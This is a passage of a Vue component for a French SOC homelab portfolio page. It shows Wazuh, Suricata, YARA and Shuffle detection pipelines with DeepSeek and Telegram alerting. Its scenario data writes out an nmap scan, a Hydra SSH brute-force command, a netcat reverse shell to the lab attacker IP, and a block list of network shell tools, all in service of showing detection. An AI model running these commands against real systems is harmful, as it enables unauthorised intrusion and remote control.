DEEPSEEK_KEY = "sk-VOTRE-CLE-API"

def query_deepseek(description: str) -> str:
    headers = {
        "Authorization": f"Bearer {DEEPSEEK_KEY}",
        "Content-Type": "application/json"
    }
    payload = {
        "model": "deepseek-chat",
        "messages": [{
            "role": "user",
            "content": (
                f"En un paragraphe concis, explique l'impact potentiel "
                f"et les mesures de remédiation pour cette menace: {description}"
            )
        }],
        "max_tokens": 300,
        "temperature": 0.3
    }
    r = requests.post(DEEPSEEK_URL, headers=headers, json=payload)
    return r.json()["choices"][0]["message"]["content"]`,
    modalLabel: 'custom-deepseek.py — DeepSeek LLM API',
    details: [
      'API DeepSeek (deepseek-chat) utilisée pour l\'enrichissement contextuel des alertes',
      'Déclenchement automatique sur alertes Wazuh niveau ≥ 10 (High & Critical)',
      'Réponse en français : impact, vecteur d\'attaque, remédiation recommandée',
      'Résultat injecté dans le contexte de l\'alerte avant création du ticket IRIS',
    ],
  },
  {
    id: 'iris-telegram',
    title: 'Phase 8 — DFIR‑IRIS & Alerting Telegram',
    tool: 'DFIR-IRIS :8443 + Bot Telegram',
    icon: Send,
    severity: 'medium',
    snippetLabel: 'custom-wazuh_iris.py + custom-telegram.py',
    body: 'Création automatique de dossiers d\'incident structurés dans DFIR-IRIS via webhook lors de toute alerte critique. Simultanément, le bot Telegram envoie une notification instantanée formatée sur smartphone. Les analystes SOC sont alertés en temps réel sans avoir à consulter le dashboard Wazuh.',
    snippet: `[SOC PANESS] [ALERTE CRITIQUE] (Niveau 12)
Règle: 100210 — Commande suspecte (nc)
Agent: agent-linux (192.168.100.30)
Heure: 2026-06-29T14:42:53Z

[IRIS] Case #2 créé automatiquement
  Titre: "Commande suspecte nc sur agent-linux"
  Sévérité: Critical | Statut: Open`,
    playbook: `# custom-telegram.py (extrait)
import requests

BOT_TOKEN = "VOTRE-TOKEN-BOT"
CHAT_ID   = "VOTRE-CHAT-ID"

def format_alert(alert: dict) -> str:
    rule  = alert.get("rule", {})
    level = rule.get("level", 0)
    severity = "[CRITIQUE]" if level >= 12 else "[ELEVE]" if level >= 7 else "[MOYEN]"
    msg  = f"*[SOC PANESS]* {severity} (Niv.{level})\n"
    msg += f"Règle: {rule.get('id')} — {rule.get('description')}\n"
    msg += f"Agent: {alert.get('agent',{}).get('name')} ({alert.get('agent',{}).get('ip')})\n"
    msg += f"Heure: {alert.get('timestamp')}"
    return msg

def send_telegram(message: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})`,
    modalLabel: 'custom-telegram.py + custom-wazuh_iris.py',
    details: [
      'DFIR-IRIS déployé en Docker sur soc-services (:8443) — SGBD PostgreSQL',
      'Tickets créés automatiquement avec titre, description, sévérité, horodatage et IOCs',
      'Bot Telegram Bot1 dédié au SOC PANESS — notification push instantanée',
      'Formatage Markdown Telegram : niveaux colorés, agent source, horodatage précis',
    ],
  },
  {
    id: 'shuffle',
    title: 'Phase 9 — Orchestration SOAR avec Shuffle',
    tool: 'Shuffle SOAR :3001',
    icon: Zap,
    severity: 'medium',
    image: '/soc/shuffle-soar.jpg',
    imageAlt: 'Shuffle SOAR — workflow automatisé 5 étapes (Wazuh→VirusTotal→DeepSeek→IRIS→Telegram)',
    snippetLabel: 'Shuffle Workflow — Automated Playbook',
    body: 'Déploiement de Shuffle SOAR pour orchestrer les flux de réponse automatisée. Les workflows Shuffle reçoivent les alertes Wazuh via webhook, interrogent VirusTotal pour la réputation des IOCs, appellent l\'API DeepSeek pour l\'enrichissement, créent le ticket IRIS et notifient Telegram — le tout de façon entièrement automatisée sans intervention humaine.',
    snippet: `[SHUFFLE] Webhook received — Wazuh Alert Level 15
[STEP 1] Extract IOCs from alert context
[STEP 2] VirusTotal API check: clean (0/70)
[STEP 3] DeepSeek enrichment: "Fichier EICAR..."
[STEP 4] IRIS Case creation: Case #3 — Open
[STEP 5] Telegram notification: sent ✓
[WORKFLOW] Completed in 4.2s — Status: SUCCESS`,
    playbook: `# Workflow Shuffle SOAR — Pipeline automatisé
# (Structure JSON simplifiée du workflow)

Trigger: Wazuh Webhook (HTTP POST :3001)
├── Action 1: Parse Alert JSON
│   └── Extract: alert.rule.id, alert.agent.ip
├── Action 2: VirusTotal Reputation Check
│   └── API: /api/v3/ip_addresses/{ip}
├── Action 3: DeepSeek LLM Enrichissement
│   └── Input: alert.rule.description
├── Action 4: DFIR-IRIS Create Case
│   └── POST /api/v1/cases — severity=critical
└── Action 5: Telegram Notification
    └── Bot1 — formatted Markdown message

# Configuration webhook Wazuh → Shuffle
<integration>
  <name>shuffle</name>
  <hook_url>http://192.168.100.20:3001/api/v1/hooks/HOOK_ID</hook_url>
  <level>9</level>
  <alert_format>json</alert_format>
</integration>`,
    modalLabel: 'Shuffle Workflow JSON + ossec.conf integration',
    details: [
      'Shuffle SOAR déployé en Docker sur soc-services (:3001) — OpenFlows compatible',
      'Workflow 5 étapes entièrement automatisé (0 intervention humaine)',
      'Intégrations natives : VirusTotal, DeepSeek, DFIR-IRIS, Telegram, Wazuh',
      'Temps d\'exécution moyen du workflow complet : 4,2 secondes',
    ],
  },
];

// ──────────────────────────────────────────────
// 4 SCÉNARIOS D'ATTAQUE (Tests réels de validation)
// ──────────────────────────────────────────────
const scenarios = [
  {
    id: 'sc-malware',
    number: '01',
    title: 'Scénario 1 : Détection Malware & Active Response YARA',
    shortDesc: 'Dépôt d\'un binaire/fichier de test malveillant (EICAR) sur endpoint Linux & Windows.',
    severity: 'critical',
    mitre: 'T1204 / T1059',
    attacker: 'kali-attacker (192.168.100.50)',
    target: 'agent-linux (192.168.100.30) & agent-windows (192.168.100.40)',
    vector: 'Dépôt du payload malveillant /home/raoulbiga/eicar_final6.txt',
    detection: 'FIM Wazuh intercepte l\'écriture et appelle yara.py (Règles Valhalla). Signature identifiée → Règle 108001 (Niveau 15 - Critique).',
    response: 'Active Response remove-threat.sh supprime immédiatement le fichier malveillant (< 0.8s).',
    status: 'Auto-Remediated (< 1s)',
    image: '/soc/yara-terminal.jpg',
    imageAlt: 'Preuve d\'exécution YARA Active Response',
    snippetLabel: 'Active Response Log — /var/ossec/logs/active-responses.log',
    snippet: `[ALERT] Wazuh Rule 108001 (Level 15) fired:
  Target : /home/raoulbiga/eicar_final6.txt
  Match  : YARA rule 'eicar_test'
[ACTION] Triggering /var/ossec/active-response/bin/remove-threat.sh
[RESULT] File successfully deleted from filesystem. Threat neutralised in 0.74s.`,
    playbook: `# Test d'attaque : Dépôt de payload EICAR
echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /home/raoulbiga/eicar_final6.txt

# Règle Wazuh 108001 (local_rules.xml)
<rule id="108001" level="15">
  <if_sid>100200</if_sid>
  <match>YARA match</match>
  <description>YARA: Fichier malveillant détecté $(yara.rule)</description>
  <mitre><id>T1204</id></mitre>
</rule>`,
    modalLabel: 'Scénario 1 : Playbook & Règles YARA',
    details: [
      'Surveillance FIM temps réel (File Integrity Monitoring) sur les répertoires sensibles (/home, /tmp)',
      'Intégration du moteur YARA v4.5.1 avec le jeu de règles Valhalla (Nextron Systems)',
      'Script Active Response remove-threat.sh configuré pour purger immédiatement le malware',
      'Zéro impact utilisateur, intégrité du système rétablie sans redémarrage',
    ],
  },
  {
    id: 'sc-nmap',
    number: '02',
    title: 'Scénario 2 : Reconnaissance Nmap & Brute-Force SSH',
    shortDesc: 'Scan de ports SYN furtif et tentatives de connexion SSH automatisées par force brute.',
    severity: 'high',
    mitre: 'T1046 / T1110',
    attacker: 'kali-attacker (192.168.100.50)',
    target: 'agent-linux (192.168.100.30:22)',
    vector: 'nmap -sS -p- 192.168.100.30 && hydra -l root -P rockyou.txt ssh://192.168.100.30',
    detection: 'Suricata NIDS capture le scan SYN (Signature 2001219) sur eth2. Wazuh agrège les alertes eve.json et les échecs auth.log (Règle 86601).',
    response: 'Levée d\'alerte Niveau 10 au SIEM, corrélation multi-sources et blocage de l\'IP attaquante.',
    status: 'Detected & Blocked',
    image: '/soc/wazuh-dashboard.jpg',
    imageAlt: 'Dashboard Wazuh - Détection de l\'attaque SSH',
    snippetLabel: 'Suricata eve.json + Wazuh Correlation',
    snippet: `{"timestamp":"2026-06-29T14:32:10","event_type":"alert","src_ip":"192.168.100.50","dest_ip":"192.168.100.30","alert":{"signature":"ET SCAN Potential SSH Scan OUTBOUND","signature_id":2001219}}
[WAZUH] Rule 86601 triggered: Multiple SSH failed logins from same IP (192.168.100.50)
[SOC] Alert escalated to Tier 1 Analyst`,
    playbook: `# Commandes de simulation (Kali Linux)
nmap -sS -T4 -p 22,80,443,8443 192.168.100.30
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.30 -t 4

# Règle Suricata (suricata.rules)
alert tcp any any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:2001219; rev:1;)`,
    modalLabel: 'Scénario 2 : Commandes Kali & Règles Suricata',
    details: [
      'Suricata NIDS déployé en écoute passive sur l\'interface réseau interne eth2',
      'Corrélation Wazuh entre événements réseau Suricata (eve.json) et logs système Linux (auth.log)',
      'Détection automatique de cadence anormale de paquets SYN et tentatives d\'authentification répétées',
      'Cartographie MITRE ATT&CK T1046 (Network Service Discovery) et T1110 (Brute Force)',
    ],
  },
  {
    id: 'sc-cmd',
    number: '03',
    title: 'Scénario 3 : Exécution de Commandes Suspectes (Netcat)',
    shortDesc: 'Tentative d\'ouverture d\'un shell distant inverse via netcat sur un serveur Linux.',
    severity: 'critical',
    mitre: 'T1059 / T1071',
    attacker: 'kali-attacker (192.168.100.50:4444)',
    target: 'agent-linux (192.168.100.30)',
    vector: '/bin/nc -e /bin/bash 192.168.100.50 4444 (Reverse Shell)',
    detection: 'Auditd capture le syscall execve() avec comm="nc". Wazuh consulte la liste CDB etc/lists/suspicious-programs et déclenche la Règle 100210 (Niveau 12).',
    response: 'Alerte critique immédiate avec extraction de l\'UID utilisateur, du PID et de la ligne de commande complète.',
    status: 'Interception Réussie',
    image: '/soc/soc-architecture.jpg',
    imageAlt: 'Architecture d\'interception Auditd & Wazuh',
    snippetLabel: 'Auditd Syscall Interception Log',
    snippet: `type=SYSCALL msg=audit(1719668573.821:492): arch=c000003e syscall=59 success=yes exit=0 a0=55a3 comm="nc" exe="/usr/bin/nc.traditional"
[CDB LOOKUP] Match found: 'nc:red' in suspicious-programs
[RULE 100210] CRITICAL (Level 12): Commande suspecte détectée (nc)
  User: raoulbiga (uid 1000) | PID: 4823`,
    playbook: `# Configuration Auditd (/etc/audit/rules.d/audit.rules)
-a always,exit -F arch=b64 -S execve -k suspicious_exec

# Liste CDB (/var/ossec/etc/lists/suspicious-programs)
nc:red
ncat:red
netcat:red
nmap:red
socat:red`,
    modalLabel: 'Scénario 3 : Règles Auditd & Base CDB',
    details: [
      'Auditd configuré avec des règles de traçage des appels système execve() sous Linux Debian 12',
      'Sysmon configuré sous Windows 10 (EventID 1 Process Creation) pour couverture cross-platform',
      'Base CDB compilée en mémoire pour une recherche binaire instantanée (< 1ms)',
      'Conformité avec les exigences de contrôle d\'accès PCI-DSS 10.6.1 et RGPD Article 35',
    ],
  },
  {
    id: 'sc-soar',
    number: '04',
    title: 'Scénario 4 : Pipeline Automatisé SOAR & IA (Shuffle + DeepSeek + IRIS)',
    shortDesc: 'Orchestration complète du flux d\'incident : de l\'alerte brute à la notification Telegram enrichie par IA.',
    severity: 'medium',
    mitre: 'Incident Response Automation',
    attacker: 'kali-attacker (192.168.100.50)',
    target: 'Infrastructure SOC PANESS IT',
    vector: 'Alerte Wazuh critique transmise par Webhook au SOAR Shuffle (:3001)',
    detection: 'Shuffle reçoit le JSON de l\'alerte, extrait l\'IP et le hash du malware.',
    response: 'Vérification VirusTotal + Analyse contextuelle par l\'IA DeepSeek + Création du ticket dans DFIR-IRIS (:8443) + Notification Push Telegram (< 4.2s).',
    status: 'Automated Pipeline (4.2s)',
    image: '/soc/shuffle-soar.jpg',
    imageAlt: 'Workflow SOAR Shuffle 5 étapes',
    snippetLabel: 'Shuffle SOAR Execution Pipeline Log',
    snippet: `[SHUFFLE] Webhook received — Wazuh Alert Level 15
[STEP 1] Extract IOCs -> IP: 192.168.100.50, Hash: eicar.txt
[STEP 2] VirusTotal API lookup -> Reputation score: Clean
[STEP 3] DeepSeek LLM Analysis -> "Menace identifiée : Fichier de test EICAR neutralisé..."
[STEP 4] DFIR-IRIS -> Case #3 created (Severity: Critical, Status: Open)
[STEP 5] Telegram Push -> Message delivered to SOC Bot1
[STATUS] Workflow completed in 4.18 seconds ✓`,
    playbook: `# Payload Webhook envoyé par Wazuh (ossec.conf)
<integration>
  <name>shuffle</name>
  <hook_url>http://192.168.100.20:3001/api/v1/hooks/HOOK_ID</hook_url>
  <level>9</level>
  <alert_format>json</alert_format>
</integration>

# Message Telegram envoyé automatiquement aux analystes
[ALERTE CRITIQUE] (Niveau 15) — SOC PANESS IT
Règle: 108001 — YARA Malware détecté & supprimé
Hôte: agent-linux (192.168.100.30)
Ticket IRIS: Case #3
Analyse DeepSeek: "Neutralisation automatique réussie."`,
    modalLabel: 'Scénario 4 : Workflow Shuffle & Template Telegram',
    details: [
      'Shuffle SOAR déployé sous Docker sur la VM soc-services (:3001)',
      'Intégration de l\'API IA DeepSeek pour la contextualisation des alertes en langage naturel',
      'Création automatisée d\'incidents structurés dans la plateforme DFIR-IRIS (:8443)',
      'Notification push instantanée vers les smartphones des analystes via Telegram Bot',
    ],
  },
];

// ──────────────────────────────────────────────
// TOPOLOGIE LAB (5 Machines Virtuelles)
// ──────────────────────────────────────────────
const topologyVms = [
  {
    name: 'wazuh-server',
    ip: '192.168.100.10',
    os: 'Amazon Linux 2023 (OVA)',
    role: 'SIEM & Corrélation Centrale',
    services: ['Wazuh Manager :1514', 'OpenSearch :9200', 'Dashboard HTTPS :443', 'Suricata NIDS (eth2)'],
    status: 'Online',
    color: '#e95420',
  },
  {
    name: 'soc-services',
    ip: '192.168.100.20',
    os: 'Ubuntu 24.04 LTS (Docker)',
    role: 'Services SOC & Orchestration SOAR',
    services: ['MISP :1443 (Threat Intel)', 'DFIR-IRIS :8443 (Incidents)', 'Shuffle SOAR :3001', 'RabbitMQ / PostgreSQL'],
    status: 'Online',
    color: '#a855f7',
  },
  {
    name: 'agent-linux',
    ip: '192.168.100.30',
    os: 'Debian 12 Bookworm',
    role: 'Endpoint Linux Surveillé',
    services: ['Wazuh Agent v4.14.5', 'Auditd (execve rules)', 'YARA v4.5.1 + Valhalla', 'remove-threat.sh'],
    status: 'Online',
    color: '#10b981',
  },
  {
    name: 'agent-windows',
    ip: '192.168.100.40',
    os: 'Windows 10 Pro',
    role: 'Endpoint Windows Surveillé',
    services: ['Wazuh Agent v4.14.5', 'Sysmon (EventID 1)', 'YARA (yara64.exe)', 'yara.py Active Response'],
    status: 'Online',
    color: '#38bdf8',
  },
  {
    name: 'kali-attacker',
    ip: '192.168.100.50',
    os: 'Kali Linux Rolling',
    role: 'Simulateur d\'Attaques (Red Team)',
    services: ['Nmap (SYN Scans)', 'Hydra (SSH Brute Force)', 'Netcat / Payload EICAR', 'Metasploit Framework'],
    status: 'Active',
    color: '#ef4444',
  },
];

// ──────────────────────────────────────────────
// Scroll Reveal & Line Progress
// ──────────────────────────────────────────────
let observer;

function openModal(phase) {
  activePhase.value = phase;
  document.body.style.overflow = 'hidden';
}

function closeModal() {
  activePhase.value = null;
  document.body.style.overflow = '';
}

onMounted(() => {
  // Fallback : rendre toutes les phases visibles après 400ms même sans scroll
  const revealAll = () => {
    phases.forEach((_, idx) => {
      setTimeout(() => {
        if (!visiblePhaseIndices.value.includes(idx)) {
          visiblePhaseIndices.value.push(idx);
        }
        lineProgress.value = Math.round(((idx + 1) / phases.length) * 100);
      }, idx * 120);
    });
  };

  // IntersectionObserver sur le wrapper local
  if (wrapperEl.value) {
    observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            const idx = parseInt(entry.target.dataset.phaseIdx, 10);
            if (!isNaN(idx) && !visiblePhaseIndices.value.includes(idx)) {
              setTimeout(() => {
                visiblePhaseIndices.value.push(idx);
                const maxIdx = Math.max(...visiblePhaseIndices.value);
                lineProgress.value = Math.round(((maxIdx + 1) / phases.length) * 100);
              }, 80);
            }
          }
        });
      },
      { threshold: 0.08, rootMargin: '0px 0px -40px 0px' },
    );
    wrapperEl.value.querySelectorAll('.soc-phase-row').forEach((el) => observer.observe(el));
  }

  // On déclenche le fallback au bout de 300ms si l'observer n'a rien capté
  setTimeout(() => {
    if (visiblePhaseIndices.value.length === 0) revealAll();
  }, 300);

  // Animation typographie terminal
  if (termCmdEl.value) {
    const fullText = termCmdEl.value.textContent;
    termCmdEl.value.textContent = '';
    let i = 0;
    const type = () => {
      if (i < fullText.length) {
        termCmdEl.value.textContent += fullText[i++];
        setTimeout(type, 35 + Math.random() * 20);
      }
    };
    setTimeout(type, 400);
  }
});

onBeforeUnmount(() => {
  observer?.disconnect();
  document.body.style.overflow = '';
});
</script>

<style scoped>
/* ══════════════════════════════════════════════
   WRAPPER GLOBAL — Thème Dark SOC
══════════════════════════════════════════════ */
.soc-timeline-wrapper {
  width: 100%;
  padding: 24px 16px 64px;
  color: #fdf8ff;
  font-family: 'Ubuntu', 'Ubuntu Sans', system-ui, sans-serif;
  background: transparent;
}

/* ══════════════════════════════════════════════
   HERO HEADER
══════════════════════════════════════════════ */
.soc-hero-header {
  max-width: 860px;
  margin: 0 auto 36px;
  text-align: center;
}

.soc-hero-badge {
  display: inline-flex;
  align-items: center;
  gap: 7px;
  font-size: 12px;
  font-weight: 800;
  letter-spacing: 0.1em;
  text-transform: uppercase;
  color: #ff7a45;
  background: rgba(233, 84, 32, 0.14);
  border: 1px solid rgba(233, 84, 32, 0.4);
  padding: 6px 14px;
  border-radius: 20px;
  margin-bottom: 18px;
  box-shadow: 0 0 16px rgba(233, 84, 32, 0.2);
}

.soc-hero-title {
  margin: 0 0 16px;
  font-size: clamp(28px, 4.2vw, 42px);
  font-weight: 900;
  line-height: 1.15;
  letter-spacing: -0.02em;
  color: #ffffff;
}

.soc-hero-title--accent {
  color: #ff6b35;
  text-shadow: 0 0 24px rgba(233, 84, 32, 0.35);
}

.soc-hero-desc {
  margin: 0 auto 24px;
  max-width: 720px;
  color: rgba(255, 255, 255, 0.82);
  font-size: 15.5px;
  line-height: 1.7;
}

.soc-hero-desc strong {
  color: #ffffff;
  font-weight: 700;
}

.soc-hero-pills {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  justify-content: center;
}

.soc-pill {
  font-size: 12px;
  font-weight: 700;
  padding: 5px 12px;
  border-radius: 14px;
  border: 1px solid transparent;
}

.pill--orange  { background: rgba(233,84,32,0.18);  color: #ff9d6c; border-color: rgba(233,84,32,0.4); }
.pill--red     { background: rgba(220,38,38,0.18);  color: #f87171; border-color: rgba(220,38,38,0.4); }
.pill--purple  { background: rgba(168,85,247,0.18); color: #d8b4fe; border-color: rgba(168,85,247,0.4); }
.pill--blue    { background: rgba(37,99,235,0.18);  color: #93c5fd; border-color: rgba(37,99,235,0.4); }
.pill--indigo  { background: rgba(99,102,241,0.18); color: #c7d2fe; border-color: rgba(99,102,241,0.4); }
.pill--green   { background: rgba(16,185,129,0.18); color: #6ee7b7; border-color: rgba(16,185,129,0.4); }
.pill--teal    { background: rgba(20,184,166,0.18); color: #5eead4; border-color: rgba(20,184,166,0.4); }

/* ══════════════════════════════════════════════
   BARRE TERMINAL
══════════════════════════════════════════════ */
.soc-terminal-bar {
  display: flex;
  align-items: center;
  gap: 10px;
  max-width: 760px;
  margin: 0 auto 52px;
  padding: 12px 20px;
  border-radius: 14px;
  background: #09040e;
  border: 1px solid rgba(233, 84, 32, 0.35);
  font-family: 'Ubuntu Mono', 'Fira Code', monospace;
  font-size: 13.5px;
  box-shadow: 0 8px 30px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.08);
}

.term-prompt { color: #10b981; font-weight: 700; white-space: nowrap; }
.term-cmd    { color: #f1f5f9; flex: 1; font-weight: 500; }
.term-cursor { color: #ff6b35; animation: blink 0.9s step-end infinite; }

@keyframes blink {
  0%, 100% { opacity: 1; }
  50%       { opacity: 0; }
}

/* ══════════════════════════════════════════════
   TRACK TIMELINE CENTRÉ
══════════════════════════════════════════════ */
.soc-timeline-track {
  position: relative;
  max-width: 1200px;
  margin: 0 auto;
}

/* Ligne centrale */
.soc-center-line {
  position: absolute;
  top: 0;
  bottom: 0;
  left: 50%;
  transform: translateX(-50%);
  width: 4px;
  background: rgba(233, 84, 32, 0.15);
  border-radius: 4px;
  z-index: 1;
  overflow: hidden;
}

.soc-center-line__fill {
  width: 100%;
  height: 0;
  /* couleur et box-shadow injectés dynamiquement via :style */
  border-radius: 4px;
  transition: height 0.5s ease, background 0.6s ease, box-shadow 0.6s ease;
}

/* ══════════════════════════════════════════════
   LIGNE DE PHASE (3 colonnes : vide | centre | contenu)
══════════════════════════════════════════════ */
.soc-phase-row {
  display: grid;
  grid-template-columns: 1fr 72px 1fr;
  gap: 0;
  align-items: start;
  margin-bottom: 60px;
  opacity: 1;
}

/* Lignes paires : carte à gauche, vide à droite */
.soc-phase-row.phase-row--left .soc-phase-side--empty   { order: 3; }
.soc-phase-row.phase-row--left .soc-phase-center        { order: 2; }
.soc-phase-row.phase-row--left .soc-phase-side--content { order: 1; text-align: left; padding-right: 32px; }

/* Lignes impaires : vide à gauche, carte à droite */
.soc-phase-row.phase-row--right .soc-phase-side--empty   { order: 1; }
.soc-phase-row.phase-row--right .soc-phase-center        { order: 2; }
.soc-phase-row.phase-row--right .soc-phase-side--content { order: 3; text-align: left; padding-left: 32px; }

.soc-phase-side { width: 100%; }

/* Centre : marqueur + numéro */
.soc-phase-center {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
  position: relative;
  z-index: 2;
  padding-top: 14px;
}

.soc-phase-number {
  position: absolute;
  top: 60px; /* sous le marqueur (52px + 8px gap) */
  font-family: 'Ubuntu Mono', monospace;
  font-size: 12px;
  font-weight: 800;
  color: rgba(255, 255, 255, 0.55);
  letter-spacing: 0.05em;
  white-space: nowrap;
  /* par défaut centré — décalé selon la classe */
  left: 50%;
  transform: translateX(-50%);
}

/* Phase paire (carte à gauche) : numéro à droite de la ligne */
.soc-phase-number--right {
  left: auto;
  right: -28px;
  transform: none;
}

/* Phase impaire (carte à droite) : numéro à gauche de la ligne */
.soc-phase-number--left {
  left: -28px;
  transform: none;
}

/* Marqueur cliquable */
.soc-phase-marker {
  width: 52px;
  height: 52px;
  border-radius: 50%;
  display: grid;
  place-items: center;
  cursor: pointer;
  border: 2.5px solid;
  background: #190f23;
  transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), box-shadow 0.3s;
  flex-shrink: 0;
  box-shadow: 0 0 16px rgba(0, 0, 0, 0.6);
}

.soc-phase-marker:hover,
.soc-phase-marker:focus-visible {
  transform: scale(1.2);
  outline: none;
}

.soc-phase-marker--critical {
  border-color: #ef4444;
  color: #ef4444;
  box-shadow: 0 0 18px rgba(239, 68, 68, 0.4);
}
.soc-phase-marker--critical:hover { box-shadow: 0 0 28px rgba(239, 68, 68, 0.7); }

.soc-phase-marker--high {
  border-color: #e95420;
  color: #e95420;
  box-shadow: 0 0 18px rgba(233, 84, 32, 0.4);
}
.soc-phase-marker--high:hover { box-shadow: 0 0 28px rgba(233, 84, 32, 0.7); }

.soc-phase-marker--medium {
  border-color: #c084fc;
  color: #c084fc;
  box-shadow: 0 0 16px rgba(192, 132, 252, 0.35);
}
.soc-phase-marker--medium:hover { box-shadow: 0 0 26px rgba(192, 132, 252, 0.6); }

.soc-phase-marker--info {
  border-color: #38bdf8;
  color: #38bdf8;
  box-shadow: 0 0 16px rgba(56, 189, 248, 0.35);
}
.soc-phase-marker--info:hover { box-shadow: 0 0 26px rgba(56, 189, 248, 0.6); }

/* ══════════════════════════════════════════════
   CARTE DE PHASE (glassmorphism sombre haute lisibilité)
══════════════════════════════════════════════ */
.glass-card {
  background: rgba(26, 16, 35, 0.94);
  backdrop-filter: blur(16px);
  -webkit-backdrop-filter: blur(16px);
  border: 1px solid rgba(233, 84, 32, 0.25);
  border-radius: 20px;
  box-shadow: 0 12px 36px rgba(0, 0, 0, 0.45);
  transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
}

.glass-card:hover {
  transform: translateY(-3px);
  box-shadow: 0 18px 48px rgba(0, 0, 0, 0.6), 0 0 20px rgba(233, 84, 32, 0.15);
  border-color: rgba(233, 84, 32, 0.5);
}

.soc-phase-card {
  padding: 24px 26px;
}

.soc-phase-card__meta {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin-bottom: 14px;
}

/* Badges de sévérité */
.severity-badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font-size: 11px;
  font-weight: 800;
  letter-spacing: 0.08em;
  padding: 4px 10px;
  border-radius: 20px;
  text-transform: uppercase;
}

.severity-badge--critical { background: rgba(239, 68, 68, 0.2); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.5); }
.severity-badge--high     { background: rgba(233, 84, 32, 0.2); color: #ff9d6c; border: 1px solid rgba(233, 84, 32, 0.5); }
.severity-badge--medium   { background: rgba(192, 132, 252, 0.2); color: #e9d5ff; border: 1px solid rgba(192, 132, 252, 0.5); }
.severity-badge--info     { background: rgba(56, 189, 248, 0.2); color: #bae6fd; border: 1px solid rgba(56, 189, 248, 0.5); }

.tool-tag {
  font-size: 11px;
  font-weight: 700;
  color: #ffb58a;
  background: rgba(233, 84, 32, 0.15);
  border: 1px solid rgba(233, 84, 32, 0.35);
  padding: 4px 11px;
  border-radius: 20px;
  font-family: 'Ubuntu Mono', monospace;
}

.soc-phase-card__title {
  margin: 0 0 12px;
  font-size: 18px;
  font-weight: 800;
  color: #ffffff;
  letter-spacing: -0.01em;
  line-height: 1.3;
}

.soc-phase-card__body {
  margin: 0 0 16px;
  font-size: 14.5px;
  line-height: 1.68;
  color: rgba(255, 255, 255, 0.82);
}

/* ══════════════════════════════════════════════
   IMAGE THUMBNAIL CLIQUABLE
══════════════════════════════════════════════ */
.soc-phase-img-btn {
  display: block;
  width: 100%;
  position: relative;
  border: none;
  background: #0d0714;
  padding: 0;
  margin-bottom: 16px;
  cursor: zoom-in;
  border-radius: 12px;
  overflow: hidden;
  border: 1px solid rgba(255, 255, 255, 0.12);
}

.soc-phase-img {
  display: block;
  width: 100%;
  height: 190px;
  object-fit: cover;
  border-radius: 12px;
  transition: transform 0.35s ease;
}

.soc-phase-img-btn:hover .soc-phase-img {
  transform: scale(1.04);
}

.soc-phase-img__overlay {
  position: absolute;
  inset: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 6px;
  background: rgba(13, 7, 20, 0.7);
  color: #ffffff;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 0.04em;
  opacity: 0;
  transition: opacity 0.25s;
}

.soc-phase-img-btn:hover .soc-phase-img__overlay,
.soc-phase-img-btn:focus-visible .soc-phase-img__overlay {
  opacity: 1;
}

.soc-phase-img-btn:focus-visible {
  outline: 2px solid #e95420;
  outline-offset: 2px;
}

/* ══════════════════════════════════════════════
   BOX TERMINAL (dark code box)
══════════════════════════════════════════════ */
.soc-term-box {
  background: #09040f;
  border-radius: 12px;
  overflow: hidden;
  margin-bottom: 16px;
  border: 1px solid rgba(255, 255, 255, 0.1);
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.06);
}

.soc-term-box__bar {
  display: flex;
  align-items: center;
  gap: 6px;
  padding: 8px 14px;
  background: #130a1c;
  border-bottom: 1px solid rgba(255, 255, 255, 0.08);
}

.dot { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; }
.dot--red    { background: #ef4444; }
.dot--yellow { background: #f59e0b; }
.dot--green  { background: #10b981; }

.soc-term-box__label {
  font-family: 'Ubuntu Mono', monospace;
  font-size: 11px;
  color: rgba(255, 255, 255, 0.55);
  margin-left: 8px;
  flex: 1;
}

.soc-term-box__code {
  margin: 0;
  padding: 14px 16px;
  font-family: 'Ubuntu Mono', 'Fira Code', monospace;
  font-size: 12.5px;
  line-height: 1.55;
  color: #e2e8f0;
  white-space: pre-wrap;
  word-break: break-word;
  overflow-x: auto;
}

.soc-term-box__code--modal {
  max-height: 400px;
  overflow-y: auto;
  font-size: 13px;
  color: #f1f5f9;
}

/* Bouton logs / playbooks */
.soc-detail-btn {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  font-size: 13px;
  font-weight: 700;
  color: #ff8a50;
  background: rgba(233, 84, 32, 0.12);
  border: 1px solid rgba(233, 84, 32, 0.35);
  padding: 8px 16px;
  border-radius: 12px;
  cursor: pointer;
  transition: all 0.2s;
}

.soc-detail-btn:hover {
  background: rgba(233, 84, 32, 0.25);
  border-color: #e95420;
  color: #ffffff;
  transform: translateY(-1px);
}

/* ══════════════════════════════════════════════
   BANDE KPIs
══════════════════════════════════════════════ */
.soc-results-band {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  gap: 0;
  max-width: 980px;
  margin: 56px auto 36px;
  background: rgba(24, 14, 32, 0.96);
  backdrop-filter: blur(14px);
  border: 1px solid rgba(233, 84, 32, 0.3);
  border-radius: 22px;
  overflow: hidden;
  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
}

.soc-kpi {
  flex: 1;
  min-width: 130px;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 24px 16px;
